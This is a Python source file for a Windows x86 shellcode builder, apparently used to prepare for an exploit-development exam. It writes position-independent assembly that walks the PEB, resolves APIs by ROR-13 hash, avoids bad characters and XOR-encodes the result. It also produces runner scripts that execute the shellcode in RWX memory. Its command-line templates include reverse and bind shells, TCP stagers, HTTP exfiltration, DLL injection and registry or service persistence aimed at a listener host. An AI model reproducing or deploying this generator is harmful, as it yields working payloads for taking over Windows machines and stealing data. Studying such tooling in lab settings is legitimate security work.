"""Assembly build pipeline: manifest -> generated.asm + generated_contract.md.

Usage:
    uv run emitrion emitrion/manifests/revshell.yaml \
        --lhost 192.168.1.116 --lport 9001 --out emitter_out/
"""
from __future__ import annotations

import argparse
import os
import pathlib
import re
import sys

from emitrion.strings import emit_push, to_dwords

from .api_database import API_DATABASE, MODULE_LOAD_ORDER, STRUCT_DATABASE
from .api_emitter import emit_module_resolution
from .build_common import (
    BuildResult,
    _apply_config_overrides,
    _assemble_aligned,
    _build_timestamp,
    _bytes_to_c,
    _bytes_to_hex_str,
    _bytes_to_py,
    _call_disp_has_badchar,
    _check_badchars,
    _generate_xor_wrapper,
    _load_template,
    _merge_template_requirements,
    _resolve_lhost,
    _strip_comments,
    _to_keystone,
    _to_nasm,
    _try_assemble,
    _try_assemble_keystone,
    _try_assemble_nasm,
    _validate_badchars,
    _write_text,
    write_outputs,
)
from .doc_gen import emit_full_contract_md
from .payload_templates.base import PayloadTemplate, TemplateConfig
from .schema import Manifest, StringEntry, VariableEntry
from .schema import load as load_manifest
from .stack_alloc import StackLayout, build_layout
from .string_emitter import emit_all_strings
from .structure_emitter import emit_all_structures


# ---------------------------------------------------------------------------
# Framework stubs - PEB-walk and export-resolution routines.
#
# Layout is null-free: callees are placed before callers so that every
# `call` instruction uses a negative (backward) relative offset whose
# upper bytes are 0xFF, never 0x00.  The entry point uses a two-hop
# `jmp short` trampoline (1-byte offset, inherently null-free) to skip
# past the stubs and reach `main`.
# ---------------------------------------------------------------------------

def _emit_framework_stubs_part1a(badchars: set[int]) -> str:
    """Generate Part 1a stubs (PEB walk + kernel32 find) with badchar-safe encoding.

    Must fit within 127 bytes of a jmp short from _start.
    """
    from .encode import (
        _disp_has_badchar,
        safe_cmp_word,
        safe_mem_load,
        safe_sub_imm,
    )
    lines: list[str] = []

    # get_first_ldr_entry: PEB -> Ldr -> InInitializationOrderModuleList
    lines.append("get_first_ldr_entry:")
    lines.append("    xor ecx, ecx")
    if not _disp_has_badchar(0x30, badchars):
        lines.append("    mov eax, fs:[ecx + 0x30]")
    else:
        from .encode import encode_dword
        lines.extend(encode_dword(0x30, badchars, "edx"))
        lines.append("    add edx, ecx")
        lines.append("    mov eax, fs:[edx]")
    lines.extend(safe_mem_load("eax", "eax", 0x0c, badchars, tmp="edx"))
    lines.extend(safe_mem_load("eax", "eax", 0x1c, badchars, tmp="edx"))
    lines.extend(safe_sub_imm("eax", 0x10, badchars, tmp="edx"))
    lines.append("    ret")
    lines.append("")

    # find_kernel32_entry: walk InInitOrder looking for KERNEL32.DLL
    lines.append("find_kernel32_entry:")
    lines.extend(safe_mem_load("esi", "eax", 0x30, badchars, tmp="edx"))
    lines.extend(safe_cmp_word("esi", 0, 0x004b, badchars, tmp="edx"))
    lines.append("    jne next")
    lines.extend(safe_cmp_word("esi", 2, 0x0045, badchars, tmp="edx"))
    lines.append("    jne next")
    lines.extend(safe_cmp_word("esi", 12, 0x0033, badchars, tmp="edx"))
    lines.append("    jne next")
    lines.extend(safe_mem_load("ebx", "eax", 0x18, badchars, tmp="edx"))
    lines.append("    ret")
    lines.append("")

    # next: advance to next module in list
    lines.append("next:")
    lines.extend(safe_mem_load("eax", "eax", 0x10, badchars, tmp="edx"))
    lines.extend(safe_sub_imm("eax", 0x10, badchars, tmp="edx"))
    lines.append("    jmp find_kernel32_entry")

    return "\n".join(lines)


def _emit_framework_stubs_part1b(badchars: set[int]) -> str:
    """Generate Part 1b stubs (export directory/tables + save context).

    Placed after the first trampoline. find_module calls back into Part 1a.
    """
    from .encode import safe_mem_load, safe_mem_store
    lines: list[str] = []

    # find_module: entry point
    lines.append("find_module:")
    lines.append("    call get_first_ldr_entry")
    lines.append("    jmp find_kernel32_entry")
    lines.append("")

    # get_export_directory: PE header -> export directory RVA
    lines.append("get_export_directory:")
    lines.extend(safe_mem_load("eax", "ebx", 0x3c, badchars, tmp="edx"))
    lines.append("    add eax, ebx")
    lines.extend(safe_mem_load("eax", "eax", 0x78, badchars, tmp="edx"))
    lines.append("    add eax, ebx")
    lines.append("    ret")
    lines.append("")

    # get_export_tables: extract NumberOfNames, AddressOfNames, etc.
    lines.append("get_export_tables:")
    lines.extend(safe_mem_load("ecx", "eax", 0x18, badchars, tmp="edx"))
    lines.extend(safe_mem_load("edi", "eax", 0x20, badchars, tmp="edx"))
    lines.append("    add edi, ebx")
    lines.extend(safe_mem_load("edx", "eax", 0x24, badchars, tmp="ecx"))
    lines.append("    add edx, ebx")
    lines.extend(safe_mem_load("esi", "eax", 0x1c, badchars, tmp="ecx"))
    lines.append("    add esi, ebx")
    lines.append("    ret")
    lines.append("")

    # save_export_context: store to stack frame (negative offsets from ebp)
    lines.append("save_export_context:")
    lines.extend(safe_mem_store("ebp", -0x04, "ebx", badchars, tmp="edx"))
    lines.extend(safe_mem_store("ebp", -0x08, "edi", badchars, tmp="edx"))
    lines.extend(safe_mem_store("ebp", -0x0c, "edx", badchars, tmp="ecx"))
    lines.extend(safe_mem_store("ebp", -0x10, "esi", badchars, tmp="edx"))
    lines.extend(safe_mem_store("ebp", -0x14, "ecx", badchars, tmp="edx"))
    lines.append("    ret")

    return "\n".join(lines)


def _emit_framework_stubs_part2(badchars: set[int]) -> str:
    """Generate Part 2 stubs (hash computation + export resolution) with badchar-safe encoding."""
    from .encode import safe_mem_load, safe_mem_store, safe_ror_imm
    lines: list[str] = []

    # compute_hash: ROR-13 hash of null-terminated string at ESI
    lines.append("compute_hash:")
    lines.append("    xor eax, eax")
    lines.append("    xor edx, edx")
    lines.append("    cld")
    lines.append("")
    lines.append("hash_loop:")
    lines.append("    lodsb")
    lines.append("    test al, al")
    lines.append("    jz hash_done")
    lines.extend(safe_ror_imm("edx", 0x0d, badchars))
    lines.append("    movzx eax, al")
    lines.append("    add edx, eax")
    lines.append("    jmp hash_loop")
    lines.append("")
    lines.append("hash_done:")
    lines.append("    ret")
    lines.append("")

    # resolve_matched_export: ordinal -> function address
    # Forwarded exports: if the function RVA falls inside the export directory
    # (RVA >= export_dir_rva && RVA < export_dir_rva + export_dir_size), the
    # entry is an ASCII forwarder string, not code.  Detect and trap.
    lines.append("resolve_matched_export:")
    lines.extend(safe_mem_load("edx", "ebp", -0x0c, badchars, tmp="eax"))
    lines.append("    movzx eax, word ptr [edx + ecx*2]")
    lines.extend(safe_mem_load("esi", "ebp", -0x10, badchars, tmp="edx"))
    lines.append("    mov eax, [esi + eax*4]")
    lines.append("")
    # --- forwarded export check ---
    # EAX = function RVA.  Re-derive export dir bounds from PE header.
    # [ebp-0x04] = module_base.  PE+0x78 = export dir RVA, PE+0x7C = size.
    # Register plan: push func_rva to free EAX, then ECX = module_base,
    # EDX = PE header VA, ESI/EDI/EAX = scratch for safe_mem_load.
    lines.append("    push eax")
    lines.extend(safe_mem_load("ecx", "ebp", -0x04, badchars, tmp="edx"))
    lines.extend(safe_mem_load("edx", "ecx", 0x3c, badchars, tmp="esi"))
    lines.append("    add edx, ecx")
    # ESI = export_dir_rva
    lines.extend(safe_mem_load("esi", "edx", 0x78, badchars, tmp="eax"))
    # EDI = export_dir_size
    lines.extend(safe_mem_load("edi", "edx", 0x7c, badchars, tmp="eax"))
    lines.append("    add edi, esi")
    lines.append("    pop eax")
    # Lower bound: func_rva < export_dir_rva -> not forwarded
    if 0x3b in badchars:
        lines.append("    push eax")
        lines.append("    sub eax, esi")
        lines.append("    pop eax")
    else:
        lines.append("    cmp eax, esi")
    lines.append("    jb not_forwarded")
    # Upper bound: func_rva < export_dir_end -> forwarded
    if 0x3b in badchars:
        lines.append("    push eax")
        lines.append("    sub eax, edi")
        lines.append("    pop eax")
    else:
        lines.append("    cmp eax, edi")
    lines.append("    jb forwarded_export")
    lines.append("")
    lines.append("not_forwarded:")
    lines.append("    add eax, ecx")
    lines.append("    ret")
    lines.append("")
    lines.append("forwarded_export:")
    lines.append("    int3")
    lines.append("")

    # resolve_export_by_hash: loop through exports comparing hashes
    lines.append("resolve_export_by_hash:")
    lines.extend(safe_mem_store("ebp", -0x18, "eax", badchars, tmp="ecx"))
    lines.append("    xor ecx, ecx")
    lines.append("")
    lines.append("find_export_loop:")
    lines.extend(safe_mem_load("edi", "ebp", -0x08, badchars, tmp="eax"))
    lines.append("    mov eax, [edi + ecx*4]")
    lines.extend(safe_mem_load("edi", "ebp", -0x04, badchars, tmp="esi"))
    lines.append("    add eax, edi")
    lines.append("    mov esi, eax")
    lines.append("    call compute_hash")
    lines.extend(safe_mem_load("eax", "ebp", -0x18, badchars, tmp="edi"))
    # cmp opcode 0x3B may be a badchar; sub sets the same flags and uses 0x2B.
    if 0x3b in badchars:
        lines.append("    sub edx, eax")
    else:
        lines.append("    cmp edx, eax")
    lines.append("    je resolve_matched_export")
    lines.append("")
    lines.append("inc_next:")
    lines.append("    inc ecx")
    lines.extend(safe_mem_load("eax", "ebp", -0x14, badchars, tmp="edi"))
    # cmp ecx, eax would modify flags from ecx and then ecx is needed as the
    # loop counter.  Use edi as scratch to preserve ecx.
    if 0x3b in badchars:
        lines.append("    mov edi, ecx")
        lines.append("    sub edi, eax")
    else:
        lines.append("    cmp ecx, eax")
    lines.append("    jl find_export_loop")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Build result
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _emit_stack_reserve(frame_size: int, badchars: set[int]) -> list[str]:
    """Emit badchar-safe 'sub esp, <frame_size>' to reserve stack frame."""
    from .encode import encode_dword
    lines = list(encode_dword(frame_size, badchars, "ecx"))
    lines.append("    sub  esp, ecx")
    return lines


def _dll_load_block(dll: str, manifest: Manifest, layout: StackLayout) -> str:
    """Generate the LoadLibraryA block for a secondary DLL."""
    from .encode import safe_add_imm, safe_call_mem, safe_mem_load, safe_mem_store

    module_slot = layout.slot(dll)
    loadlib_off = -layout.slot("LoadLibraryA").offset
    module_off = -module_slot.offset

    push_result = emit_push(dll, badchars=manifest.badchars)
    cleanup = len(to_dwords(dll)) * 4
    bc = manifest.badchars

    lines = [
        f"; -- Loading {dll} via LoadLibraryA --",
        "",
        push_result.asm,
        f"    push esi                    ; lpLibFileName = &{dll}",
        *safe_call_mem("ebp", loadlib_off, bc),
        *safe_mem_store("ebp", module_off, "eax", bc),
        f"    ; {dll} base",
    ]
    lines.extend(safe_add_imm("esp", cleanup, bc, tmp="ecx"))
    lines.append("    ; pop string from stack")
    lines += [
        "",
        *safe_mem_load("ebx", "ebp", module_off, bc),
        "    call get_export_directory",
        "    call get_export_tables",
        "    call save_export_context",
        "",
    ]
    return "\n".join(lines)


def _generate_test_harness(shellcode_len: int) -> str:
    """Generate a standalone Python test harness for Windows x86 shellcode."""
    return f'''\
#!/usr/bin/env python3
"""Test harness for emitter-generated shellcode.

Copy this file and shellcode.bin to the Windows lab VM, then:
  python test_harness.py

Attach WinDbg before pressing Enter. The shellcode address is printed
so you can set a breakpoint:
  bp <address>
"""
import ctypes
import sys
from pathlib import Path

SHELLCODE_LEN = {shellcode_len}


def main():
    bin_path = Path(__file__).with_name("shellcode.bin")
    if not bin_path.exists():
        print(f"[-] {{bin_path}} not found", file=sys.stderr)
        sys.exit(1)

    shellcode = bytearray(bin_path.read_bytes())
    if len(shellcode) != SHELLCODE_LEN:
        print(
            f"[!] Expected {{SHELLCODE_LEN}} bytes, got {{len(shellcode)}}",
            file=sys.stderr,
        )

    kernel32 = ctypes.windll.kernel32

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong,
    ]
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    ]
    kernel32.CreateThread.restype = ctypes.c_void_p

    ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    if not ptr:
        print("[-] VirtualAlloc failed", file=sys.stderr)
        sys.exit(1)

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), len(shellcode))

    print(f"[+] Shellcode: {{len(shellcode)}} bytes")
    print(f"[+] Address:   {{ptr:#010x}}")
    print(f"[+] WinDbg:    bp {{ptr:#010x}}")
    print()
    input("... attach WinDbg, then press Enter to execute ...")

    ht = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if not ht:
        print("[-] CreateThread failed", file=sys.stderr)
        sys.exit(1)

    kernel32.WaitForSingleObject(ht, -1)


if __name__ == "__main__":
    main()
'''


def _generate_debug_runner(asm: str) -> str:
    """Generate a self-contained Python debug script with inline assembly.

    The script assembles the shellcode with keystone on the Windows lab VM,
    allocates RWX memory, prints the address for WinDbg, pauses, then
    executes. The assembly is embedded so it can be edited directly.
    """
    asm = asm.replace(";", "#")
    escaped_asm = asm.replace("\\", "\\\\").replace('"""', '\\"\\"\\"')
    return f'''\
#!/usr/bin/env python3
"""Debug runner for emitter-generated shellcode.

Copy this file to the Windows lab VM, then:
  python debug_runner.py

The assembly source is embedded below - edit it directly to experiment.
Requires: pip install keystone-engine

This runner assembles 32-bit x86 shellcode. Run it under 32-bit Python.
It allocates and copies the bytes before pausing for the debugger.
Attach WinDbg to this exact python.exe process before pressing Enter.
The allocation remains valid while this Python process is alive.
Use the printed address to set a breakpoint:
  bp <address>
"""
import ctypes
import sys

from keystone import KS_ARCH_X86, KS_MODE_32, Ks

CODE = r"""
{escaped_asm}
"""


def main():
    # Assemble the embedded text only. No shellcode has executed yet.
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    cleaned = CODE.replace("jmp short ", "jmp ")
    try:
        encoding, count = ks.asm(cleaned)
    except Exception as e:
        print(f"[-] Assembly failed: {{e}}", file=sys.stderr)
        print("[*] Scanning for the failing instruction...", file=sys.stderr)
        all_lines = cleaned.split("\\n")
        accum = []
        for i, ln in enumerate(all_lines):
            accum.append(ln)
            try:
                ks.asm("\\n".join(accum))
            except Exception:
                print(f"    line {{i+1}}: {{ln.strip()!r}}", file=sys.stderr)
                accum.pop()
        sys.exit(1)

    shellcode = bytearray(encoding)

    kernel32 = ctypes.windll.kernel32

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong,
    ]
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    ]
    kernel32.CreateThread.restype = ctypes.c_void_p

    # Reserve and commit executable memory in this Python process.
    ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    if not ptr:
        print("[-] VirtualAlloc failed", file=sys.stderr)
        sys.exit(1)

    # Copy the assembled bytes before the debugger attach window opens.
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), len(shellcode))

    print(f"[+] Instructions: {{count}}")
    print(f"[+] Shellcode:    {{len(shellcode)}} bytes")
    print(f"[+] Address:      {{ptr:#010x}}")
    print(f"[+] WinDbg:       bp {{ptr:#010x}}")
    print()
    print(f'shellcode = b"' + "".join(f"\\\\x{{b:02x}}" for b in shellcode) + '"')
    print()
    # Do not continue until WinDbg is attached to this python.exe instance.
    input("... attach WinDbg, then press Enter to execute ...")

    # Start a new thread at the first byte of the copied shellcode.
    ht = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if not ht:
        print("[-] CreateThread failed", file=sys.stderr)
        sys.exit(1)

    kernel32.WaitForSingleObject(ht, -1)


if __name__ == "__main__":
    main()
'''


def _generate_code_snippet(asm: str) -> str:
    """Generate a standalone Python script with Keystone-compatible assembly.

    The script contains the assembly as CODE = r\"\"\"...\"\"\" and can:
    1. Assemble it with Keystone and run the shellcode (default)
    2. Output raw hex with --hex
    3. Output Python bytes with --py
    4. Write a .bin file with --bin FILE
    """
    ks_asm = _to_keystone(asm)
    ks_asm = ks_asm.replace("\\", "\\\\").replace('"""', '\\"\\"\\"')
    return f'''\
#!/usr/bin/env python3
"""Keystone-compatible assembly snippet from the emitter.

Usage on the exam box:
  python code_snippet.py              # assemble + run (attach WinDbg first)
  python code_snippet.py --hex        # print raw hex string
  python code_snippet.py --py         # print Python bytes literal
  python code_snippet.py --bin sc.bin # write raw binary file

Requires: pip install keystone-engine
"""
import argparse
import ctypes
import sys

try:
    from keystone import KS_ARCH_X86, KS_MODE_32, Ks
except ImportError:
    print("[-] keystone-engine not installed.", file=sys.stderr)
    print("    pip install keystone-engine", file=sys.stderr)
    sys.exit(1)

CODE = r"""
{ks_asm}
"""


def assemble(code: str) -> bytes:
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(code)
    print(f"[+] Assembled {{count}} instructions, {{len(encoding)}} bytes", file=sys.stderr)
    return bytes(encoding)


def main():
    parser = argparse.ArgumentParser(description="Assemble and optionally run shellcode")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--hex", action="store_true", help="Print hex string to stdout")
    group.add_argument("--py", action="store_true", help="Print Python bytes literal")
    group.add_argument("--bin", metavar="FILE", help="Write raw binary to FILE")
    group.add_argument("--run", action="store_true", default=True, help="Assemble and run (default)")
    args = parser.parse_args()

    try:
        shellcode = assemble(CODE)
    except Exception as e:
        print(f"[-] Assembly failed: {{e}}", file=sys.stderr)
        sys.exit(1)

    if args.hex:
        print("".join(f"\\\\x{{b:02x}}" for b in shellcode))
        return

    if args.py:
        chunks = [shellcode[i:i + 16] for i in range(0, len(shellcode), 16)]
        lines = ['b"' + "".join(f"\\\\x{{b:02x}}" for b in c) + '"' for c in chunks]
        print(f"shellcode = (\\n" + "\\n".join(lines) + f"\\n)\\n# Length: {{len(shellcode)}} bytes")
        return

    if args.bin:
        with open(args.bin, "wb") as f:
            f.write(shellcode)
        print(f"[+] Wrote {{len(shellcode)}} bytes to {{args.bin}}")
        return

    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong,
    ]
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    ]
    kernel32.CreateThread.restype = ctypes.c_void_p

    ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    if not ptr:
        print("[-] VirtualAlloc failed", file=sys.stderr)
        sys.exit(1)

    buf = (ctypes.c_char * len(shellcode)).from_buffer(bytearray(shellcode))
    kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), len(shellcode))

    print(f"[+] Shellcode: {{len(shellcode)}} bytes")
    print(f"[+] Address:   {{ptr:#010x}}")
    print(f"[+] WinDbg:    bp {{ptr:#010x}}")
    print()
    input("... attach WinDbg, then press Enter to execute ...")

    ht = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if not ht:
        print("[-] CreateThread failed", file=sys.stderr)
        sys.exit(1)

    kernel32.WaitForSingleObject(ht, -1)


if __name__ == "__main__":
    main()
'''




# ---------------------------------------------------------------------------
# Assembly composition
# ---------------------------------------------------------------------------


def compose_asm(
    manifest: Manifest,
    layout: StackLayout,
    manifest_path: str,
    template: PayloadTemplate | None = None,
    config: TemplateConfig | None = None,
) -> str:
    """Compose the full assembly text from all emitter components."""
    config = config or TemplateConfig()
    template_name = type(template).__name__ if template else "none"

    # Manifest push-strings whose value matches a DLL name are handled inline
    # in the module-loading block; skip them in the string section.
    dll_names = {info.dll for info in MODULE_LOAD_ORDER}
    dll_string_labels = {
        e.label for e in manifest.strings if e.value in dll_names
    }

    parts: list[str] = [
        "; AUTO-GENERATED by emitter-v1",
        f"; Manifest: {manifest_path}",
        f"; Template: {template_name}",
        f"; Generated: {_build_timestamp()}",
        "",
        "    _start:",
        "        jmp short _stub_trampoline1",
        "",
        "; -- Framework Stubs --",
        "",
        _emit_framework_stubs_part1a(config.badchars),
        "_stub_trampoline1:",
        "    jmp short _stub_trampoline2",
        "",
        _emit_framework_stubs_part1b(config.badchars),
        "_stub_trampoline2:",
        "    jmp short main",
        "",
        _emit_framework_stubs_part2(config.badchars),
        "; -- Main --",
        "",
        "; __ALIGNMENT_NOPS__",
        "",
        "main:",
        "    mov  ebp, esp",
        "    xor  ecx, ecx",
        *_emit_stack_reserve(layout.frame_size, config.badchars),
        "",
        "    ; Bootstrap: find kernel32 via PEB walk",
        "    call find_module",
        "    call get_export_directory",
        "    call get_export_tables",
        "    call save_export_context",
        "",
    ]

    for mi in MODULE_LOAD_ORDER:
        module_funcs = [n for n in manifest.functions if API_DATABASE[n].module == mi.dll]
        if not module_funcs:
            continue

        if mi.load_via == "LoadLibraryA":
            if "LoadLibraryA" not in manifest.functions:
                raise ValueError(
                    f"Manifest uses APIs from {mi.dll} but does not declare "
                    f"LoadLibraryA. Add LoadLibraryA to the functions list."
                )
            parts.append(_dll_load_block(mi.dll, manifest, layout))

        resolution = emit_module_resolution(manifest, layout, mi.dll)
        if resolution.strip():
            parts.append(resolution)

    parts += [
        "; -- String Construction --",
        "",
    ]
    str_asm = emit_all_strings(manifest, layout, skip_labels=dll_string_labels)
    if str_asm.strip():
        parts.append(str_asm)
    else:
        parts += ["; (no strings)", ""]

    parts += [
        "; -- Structure Initialization --",
        "",
    ]
    struct_asm = emit_all_structures(manifest, layout)
    if struct_asm.strip():
        parts.append(struct_asm)
    else:
        parts += ["; (no structures)", ""]

    parts += [
        "; -- Payload --",
        "",
    ]
    if template is not None:
        parts.append(template.emit(layout, config))
    else:
        parts += ["; (no template - insert payload assembly here)", ""]

    from .workflow.reference import WorkflowTemplate
    is_legacy = template is not None and not isinstance(template, WorkflowTemplate)
    if is_legacy and "ExitProcess" in manifest.functions:
        from .encode import safe_call_mem
        ep_off = -layout.slot("ExitProcess").offset
        parts += [
            "; -- Clean Exit --",
            "    xor  eax, eax",
            "    push eax                    ; uExitCode = 0",
            *safe_call_mem("ebp", ep_off, config.badchars),
            "",
        ]

    parts += [
        "hang:",
        "    jmp hang",
        "",
    ]

    return "\n".join(parts)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def build(
    manifest_path: str,
    template_name: str | None = None,
    config: TemplateConfig | None = None,
    out_dir: str = "emitter_out",
    assemble: bool = True,
    encode: bool = False,
    raw: bool = False,
) -> BuildResult:
    """Run the full build pipeline. Returns a BuildResult.

    When *encode* is True and the assembled payload contains badchar
    violations, the XOR encoder is invoked automatically.  The raw
    (unencoded) shellcode is still available in *shellcode_bytes*; the
    encoded output goes into *encoded_bytes*.

    When *raw* is True, inline badchar avoidance is skipped during code
    generation (no XOR-mask pairs for immediates, no safe_* indirection).
    The manifest badchars are still recorded for post-assembly validation
    and XOR encoding. Use ``--raw --encode`` to produce the smallest
    shellcode with a whole-payload XOR wrapper.
    """
    from .scanner import scan
    from .xor_encoder import xor_encode

    manifest = load_manifest(manifest_path)
    if manifest.arch == "x64":
        from .build_x64 import build_x64 as _build_x64
        return _build_x64(
            manifest_path, template_name=template_name,
            config=config, out_dir=out_dir, assemble=assemble,
            encode=encode, raw=raw,
        )
    config = config or TemplateConfig()
    manifest_badchars = manifest.badchars
    config.badchars = set() if raw else manifest.badchars
    manifest = _apply_config_overrides(manifest, config)

    effective_template = template_name or manifest.template
    template = _load_template(effective_template) if effective_template else None
    extra_structs: list[str] | None = None
    if template is not None:
        manifest = _merge_template_requirements(manifest, template, config)
        from emitrion.workflow.reference import WorkflowTemplate
        if isinstance(template, WorkflowTemplate):
            extra_structs = list(template.probe_structs(config).values())
    layout = build_layout(manifest, extra_structs=extra_structs)
    asm = compose_asm(manifest, layout, manifest_path, template, config)

    raw: bytes | None = None
    assembler: str | None = None
    asm_errors: list[str] = []
    encoded_bytes: bytes | None = None
    encoder_report: str | None = None

    if assemble:
        raw, assembler, asm, asm_errors = _assemble_aligned(asm, manifest_badchars)
        if raw:
            scan_result = scan(raw, manifest_badchars)
            if not scan_result.clean:
                if encode:
                    enc = xor_encode(raw, manifest_badchars)
                    encoder_report = enc.diagnostics
                    if enc.success:
                        encoded_bytes = enc.encoded
                    else:
                        asm_errors = (asm_errors or []) + [
                            f"[!] Encoding failed: {enc.diagnostics}"
                        ]
                else:
                    violations = _check_badchars(raw, manifest_badchars)
                    asm_errors = (asm_errors or []) + violations

    contract_md = emit_full_contract_md(
        manifest, layout, template, config,
        shellcode_size=len(raw) if raw else None,
    )

    return BuildResult(
        manifest_path=manifest_path,
        asm=asm,
        contract_md=contract_md,
        shellcode_bytes=raw,
        hex_str=_bytes_to_hex_str(raw) if raw else None,
        py_bytes=_bytes_to_py(raw) if raw else None,
        c_array=_bytes_to_c(raw) if raw else None,
        test_harness=_generate_test_harness(len(raw)) if raw else None,
        debug_runner=_generate_debug_runner(asm),
        code_snippet=_generate_code_snippet(asm),
        layout=layout,
        assembler=assembler,
        asm_errors=asm_errors if asm_errors else None,
        encoded_bytes=encoded_bytes,
        encoder_report=encoder_report,
        xor_wrapper=_generate_xor_wrapper("x86", manifest_badchars),
    )




# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def main() -> None:
    parser = argparse.ArgumentParser(
        description="emitter-v1: manifest -> assembly + contract",
    )
    parser.add_argument("manifest", help="Path to manifest YAML file")
    parser.add_argument(
        "--template",
        choices=["reverse_shell", "run_command", "copy_file", "copy_then_run", "move_then_run", "tcp_download", "tcp_stager", "bind_shell", "http_download", "http_exfil", "process_replace", "service_persist", "dll_inject", "registry_persist", "check_path", "ir_run_command", "ir_reverse_shell", "ir_bind_shell"],
    )
    parser.add_argument("--out", default="emitter_out", help="Output directory")
    parser.add_argument("--lhost", default=None, metavar="IP|IFACE",
                        help="Listener/server IP or interface (e.g. tun0). "
                             "Auto-extracted from --url for http_download.")
    parser.add_argument("--lport", type=int, default=None,
                        help="Listener/server port. "
                             "Auto-extracted from --url for http_download.")
    parser.add_argument("--command", default=None)
    parser.add_argument("--src", default=None)
    parser.add_argument("--dst", default=None)
    parser.add_argument("--process-name", default=None,
                        help="Target process name for process_replace template")
    parser.add_argument("--service-name", default=None,
                        help="Service name for service_persist template")
    parser.add_argument("--url", default=None, help="URL for http_download template")
    parser.add_argument("--payload-file", default=None, metavar="PATH",
                        help="Local file being served; sets VirtualAlloc size "
                             "to match (rounded up to page boundary)")
    parser.add_argument("--no-assemble", action="store_true")
    parser.add_argument(
        "--encode", action="store_true",
        help="Apply XOR encoding when badchar violations are detected",
    )
    parser.add_argument(
        "--raw", action="store_true",
        help="Skip inline badchar avoidance (smallest shellcode). "
             "Combine with --encode for whole-payload XOR encoding.",
    )

    args = parser.parse_args()

    lhost = _resolve_lhost(args.lhost) if args.lhost else None
    lport = args.lport

    url_path = None
    if args.url is not None:
        from urllib.parse import urlparse
        parsed = urlparse(args.url)
        if lhost is None and parsed.hostname:
            lhost = parsed.hostname
        if lport is None and parsed.port:
            lport = parsed.port
        url_path = parsed.path or "/"

    if lhost is None:
        lhost = "127.0.0.1"
    if lport is None:
        lport = 4444

    alloc_size = None
    if args.payload_file is not None:
        import os
        fsize = os.path.getsize(args.payload_file)
        page = 0x1000
        alloc_size = ((fsize + page - 1) // page) * page
        if alloc_size == 0:
            alloc_size = page
        print(f"[+] Payload file: {args.payload_file} ({fsize} bytes)")
        print(f"[+] Alloc size:   0x{alloc_size:x} ({alloc_size} bytes)")

    config = TemplateConfig(
        lhost=lhost,
        lport=lport,
        command=args.command,
        src_path=args.src,
        dst_path=args.dst,
        url=args.url,
        url_path=url_path,
        alloc_size=alloc_size,
        process_name=args.process_name,
        service_name=args.service_name,
    )

    result = build(
        args.manifest,
        template_name=args.template,
        config=config,
        out_dir=args.out,
        assemble=not args.no_assemble,
        encode=args.encode,
        raw=args.raw,
    )
    write_outputs(result, args.out)

    print(f"[+] Generated: {args.out}/asm/generated.asm")
    print(f"[+] Debug:     {args.out}/asm/debug_runner.py")
    print(f"[+] Snippet:   {args.out}/asm/code_snippet.py")
    print(f"[+] Contract:  {args.out}/Documentation/contract.md")
    if result.shellcode_bytes:
        print(f"[+] Assembler: {result.assembler}")
        print(f"[+] Shellcode: {len(result.shellcode_bytes)} bytes (raw)")
        print(f"[+] Hex:       {args.out}/bin/shellcode.{{bin,hex,py,c}}")
        print(f"[+] Harness:   {args.out}/bin/test_harness.py")
        if result.encoded_bytes:
            print(f"[+] Encoded:   {len(result.encoded_bytes)} bytes (XOR)")
            print(f"[+] Encoded:   {args.out}/bin/shellcode_encoded.{{bin,hex,py,c}}")
        if result.encoder_report:
            print(f"[+] Report:    {args.out}/Documentation/encoder_report.txt")
        if result.asm_errors:
            for err in result.asm_errors:
                print(f"    {err}", file=sys.stderr)
            if not result.encoded_bytes:
                sys.exit(1)
    else:
        if result.asm_errors:
            print("[!] Assembly failed:")
            for err in result.asm_errors:
                print(f"    {err}")
            sys.exit(1)
        elif not args.no_assemble:
            print("[!] Assembly requested but no assembler available")
            sys.exit(1)
        else:
            print("[*] Assembly skipped (--no-assemble)")


if __name__ == "__main__":
    main()
